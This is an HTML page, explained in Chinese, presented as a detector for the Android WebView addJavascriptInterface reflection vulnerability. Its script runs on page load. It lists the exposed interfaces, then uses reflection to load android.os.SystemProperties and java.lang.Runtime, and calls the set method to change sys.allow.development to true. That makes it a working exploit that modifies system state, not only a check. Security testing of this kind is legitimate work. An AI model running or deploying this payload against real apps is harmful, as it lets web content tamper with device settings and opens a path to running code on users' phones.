<!doctype html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>WebView漏洞检测与SystemProperties操作</title>
        <meta
            name="viewport"
            content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
        />
    </head>
    <body>
        <p>
            提示：如何检测出"accessibility"和
            "accessibilityTraversal"接口----设置-辅助功能-开启系统或第三方辅助服务<br /><br />
            注意事项：<br />
            1. 这段代码假设WebView存在漏洞，允许通过JavaScript调用Java反射API<br />
            2. 在Android
            4.4.4及以上版本，直接调用getClass已被禁止，但通过ClassLoader.loadClass仍然可能可行<br />
            3.
            代码中尝试通过发现的漏洞接口来加载android.os.SystemProperties类并调用其get/set方法<br />
            4. 实际执行需要满足以下条件：<br />
            - addJavascriptInterface绑定的对象是Context的子类(通常是Activity)<br />
            - targetSdkVersion 小于 17 或者目标方法有@JavaScriptInterface注解<br />
            - WebView已启用JavaScript支持<br /><br />
            <b
                ><font color="red"
                    >如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：</font
                ></b
            >
        </p>

        <script type="text/javascript">
            function check() {
                for (var obj in window) {
                    try {
                        if (
                            "getClass" in window[obj] ||
                            "getClassLoader" in window[obj]
                        ) {
                            try {
                                window[obj].getClass();
                                document.write(
                                    '<span style="color:red">' +
                                        obj +
                                        " getClass</span>"
                                );
                                document.write("<br/>");
                            } catch (e) {}

                            try {
                                window[obj].getClassLoader();
                                document.write(
                                    '<span style="color:red">' +
                                        obj +
                                        " getClassLoader</span>"
                                );
                                document.write("<br/>");
                            } catch (e) {}

                            // 尝试获取SystemProperties并操作
                            try {
                                var runtimeClass = window[obj]
                                    .getClassLoader()
                                    .loadClass("java.lang.Runtime");
                                var systemPropertiesClass = window[obj]
                                    .getClassLoader()
                                    .loadClass("android.os.SystemProperties");

                                // 获取get和set方法
                                var sysPropGet = null;
                                var sysPropSet = null;
                                var methods =
                                    systemPropertiesClass.getMethods();
                                for (var i = 0; i < methods.length; i++) {
                                    var method = methods[i];
                                    if (method.getName() === "get") {
                                        sysPropGet = method;
                                    } else if (method.getName() === "set") {
                                        sysPropSet = method;
                                    }
                                }

                                // 调用方法
                                if (sysPropGet) {
                                    var defaultValue = sysPropGet.invoke(
                                        null,
                                        "sys.allow.development",
                                        "默认值"
                                    );
                                    document.write(
                                        '<span style="color:blue">SystemProperties.get: sys.allow.development=' +
                                            defaultValue +
                                            "</span><br/>"
                                    );
                                }

                                if (sysPropSet) {
                                    sysPropSet.invoke(
                                        null,
                                        "sys.allow.development",
                                        "true"
                                    );
                                    document.write(
                                        '<span style="color:green">SystemProperties.set: sys.allow.development set to true</span><br/>'
                                    );

                                    // 再次获取验证
                                    if (sysPropGet) {
                                        var newValue = sysPropGet.invoke(
                                            null,
                                            "sys.allow.development",
                                            "默认值"
                                        );
                                        document.write(
                                            '<span style="color:blue">SystemProperties.get after set: sys.allow.development=' +
                                                newValue +
                                                "</span><br/>"
                                        );
                                    }
                                }
                            } catch (e) {
                                document.write(
                                    '<span style="color:orange">SystemProperties操作失败: ' +
                                        e +
                                        "</span><br/>"
                                );
                            }
                        }
                    } catch (e) {}
                }
            }

            check();
        </script>
    </body>
</html>
